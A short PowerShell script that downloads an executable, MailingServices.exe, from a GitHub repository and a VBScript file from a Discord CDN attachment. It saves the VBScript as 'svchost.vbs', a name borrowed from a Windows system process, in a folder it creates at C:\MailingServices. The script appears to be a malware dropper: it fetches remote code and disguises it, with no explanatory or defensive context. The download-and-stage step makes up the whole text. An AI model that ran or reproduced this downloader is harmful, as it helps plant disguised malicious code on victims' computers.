$url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
$outputPath = "C:\MailingServices\MailingServices.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$url2 = "https://cdn.discordapp.com/attachments/1159474640641605713/1175479420782383114/17003262731034685.vbs?ex=656b6185&is=6558ec85&hm=510b912de6db328b220f929aa048aedbbd490876222bb75a448f2bca333c6098&"
$outputPath2 = "C:\MailingServices\svchost.vbs"
Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
